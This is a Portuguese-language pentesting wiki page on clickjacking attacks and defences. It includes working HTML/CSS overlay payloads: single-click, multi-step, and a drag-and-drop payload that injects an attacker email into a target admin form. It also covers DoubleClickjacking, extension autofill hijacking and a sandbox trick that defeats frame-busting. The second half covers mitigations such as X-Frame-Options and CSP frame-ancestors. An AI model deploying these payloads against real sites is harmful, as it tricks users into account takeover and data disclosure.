# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## O que é Clickjacking

Em um ataque de Clickjacking, um **usuário** é **enganado** a **clicar** em um **elemento** em uma página web que está **invisível** ou disfarçado como um elemento diferente.

Essa manipulação pode levar a consequências não intencionais para o usuário, como o download de malware, redirecionamento para páginas web maliciosas, fornecimento de credenciais ou informações sensíveis, transferências de dinheiro ou compra de produtos online.

### Truque de pré-preenchimento de formulários

Às vezes é possível **preencher o valor dos campos de um formulário usando parâmetros GET ao carregar a página**. Um atacante pode abusar desse comportamento para preencher um formulário com dados arbitrários e enviar o clickjacking payload para que o usuário pressione o botão Submit.

### Preencher formulário com Drag\&Drop

Se você precisa que o usuário **preencha um formulário** mas não quer pedir diretamente para que ele escreva alguma informação específica (como o email e/ou uma password específica que você conhece), você pode apenas pedir para que ele **Drag\&Drop** algo que escreverá seus dados controlados como em [**this example**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Basic Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Payload em Múltiplas Etapas
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Se você identificou um **XSS attack that requires a user to click** em algum elemento para **trigger** o XSS e a página é **vulnerable to clickjacking**, você pode abusar disso para enganar o usuário a clicar no botão/link.\
Exemplo:\
Você encontrou um **self XSS** em alguns detalhes privados da conta (detalhes que **somente você pode set e read**). A página com o **form** para definir esses detalhes é **vulnerable** a **Clickjacking** e você pode **prepopulate** o **form** com os GET parameters.\
Um atacante poderia preparar um ataque de **Clickjacking** nessa página **prepopulating** o **form** com o **XSS payload** e **tricking** o **user** para **Submit** o form. Então, **quando o form é submitted** e os valores são modificados, o **user irá executar o XSS**.


### DoubleClickjacking

Primeiramente [explained in this post](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html), essa técnica pede que a vítima dê um double click em um botão de uma página controlada colocada em uma localização específica, e usa as diferenças de timing entre os eventos mousedown e onclick para carregar a página da vítima durante o double click de modo que a **victim actually clicks a legit button in the victim page**.

Um exemplo pode ser visto neste vídeo: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

Um exemplo de código pode ser encontrado em [this page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> This technique allows to trick the user to click on 1 place in the victim page bypassing every protection against clickjacking. So the attacker needs to find **sensitive actions that can be done with just 1 click, like OAuth prompts accepting permissions**.

### Browser extensions: DOM-based autofill clickjacking

Além de iframing victim pages, atacantes podem mirar elementos de UI de browser extensions que são injetados na página. Password managers renderizam autofill dropdowns próximos aos inputs com foco; ao focar um campo controlado pelo atacante e esconder/ocluir o dropdown da extension (truques de opacity/overlay/top-layer), um clique coagido do usuário pode selecionar um item armazenado e preencher dados sensíveis em inputs controlados pelo atacante. Essa variante não requer exposição via iframe e funciona inteiramente via manipulação do DOM/CSS.

- For concrete techniques and PoCs see:
-
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Strategies to Mitigate Clickjacking

### Client-Side Defenses

Scripts executados no lado do cliente podem realizar ações para prevenir Clickjacking:

- Garantir que a janela da aplicação seja a janela principal ou top window.
- Tornar todos os frames visíveis.
- Prevenir cliques em frames invisíveis.
- Detectar e alertar usuários sobre possíveis tentativas de Clickjacking.

No entanto, esses frame-busting scripts podem ser contornados:

- **Browsers' Security Settings:** Alguns navegadores podem bloquear esses scripts com base nas configurações de segurança ou na falta de suporte a JavaScript.
- **HTML5 iframe sandbox Attribute:** Um atacante pode neutralizar frame buster scripts definindo o atributo sandbox com os valores allow-forms ou allow-scripts sem allow-top-navigation. Isso impede que o iframe verifique se é a top window, por exemplo,
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
Os valores allow-forms e allow-scripts habilitam ações dentro do iframe enquanto desativam a navegação no nível superior. Para garantir a funcionalidade pretendida do site alvo, permissões adicionais como allow-same-origin e allow-modals podem ser necessárias, dependendo do tipo de ataque. Mensagens no console do navegador podem indicar quais permissões permitir.

### Defesas no Lado do Servidor

#### X-Frame-Options

O **X-Frame-Options HTTP response header** informa aos navegadores sobre a legitimidade de renderizar uma página em um <frame> ou <iframe>, ajudando a prevenir Clickjacking:

- X-Frame-Options: deny - Nenhum domínio pode exibir o conteúdo em um frame.
- X-Frame-Options: sameorigin - Apenas o site atual pode exibir o conteúdo em um frame.
- X-Frame-Options: allow-from https://trusted.com - Somente o 'uri' especificado pode emoldurar a página.
- Observe as limitações: se o navegador não suportar essa diretiva, ela pode não funcionar. Alguns navegadores preferem a diretiva CSP frame-ancestors.

#### Diretiva frame-ancestors do Content Security Policy (CSP)

**frame-ancestors directive in CSP** é o método recomendado para proteção contra Clickjacking:

- frame-ancestors 'none' - Semelhante a X-Frame-Options: deny.
- frame-ancestors 'self' - Semelhante a X-Frame-Options: sameorigin.
- frame-ancestors trusted.com - Semelhante a X-Frame-Options: allow-from.

Por exemplo, a seguinte CSP permite enquadramento apenas do mesmo domínio:

Content-Security-Policy: frame-ancestors 'self';

Mais detalhes e exemplos complexos podem ser encontrados em [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) e [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) com child-src e frame-src

**Content Security Policy (CSP)** é uma medida de segurança que ajuda a prevenir Clickjacking e outros ataques de injeção de código, especificando quais fontes o navegador deve permitir carregar conteúdo.

#### Diretiva frame-src

- Define as fontes válidas para frames.
- Mais específica que a diretiva default-src.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Esta política permite frames da mesma origem (self) e https://trusted-website.com.

#### child-src Diretiva

- Introduzida no CSP nível 2 para definir fontes válidas para web workers e frames.
- Age como fallback para frame-src e worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Esta política permite frames e workers da mesma origem (self) e https://trusted-website.com.

**Notas de Uso:**

- Depreciação: child-src está sendo descontinuado em favor de frame-src e worker-src.
- Comportamento de fallback: Se frame-src estiver ausente, child-src é usado como fallback para frames. Se ambos estiverem ausentes, default-src é usado.
- Definição estrita de fontes: inclua apenas fontes confiáveis nas diretivas para evitar exploração.

#### Scripts JavaScript de frame-busting

Embora não sejam completamente infalíveis, scripts de frame-busting baseados em JavaScript podem ser usados para impedir que uma página web seja incorporada em um frame. Exemplo:
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Empregando Anti-CSRF Tokens

- **Validação de Token:** Utilize anti-CSRF tokens em aplicações web para garantir que requisições que alteram o estado sejam feitas intencionalmente pelo usuário e não através de uma página Clickjacked.

## Referências

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../banners/hacktricks-training.md}}
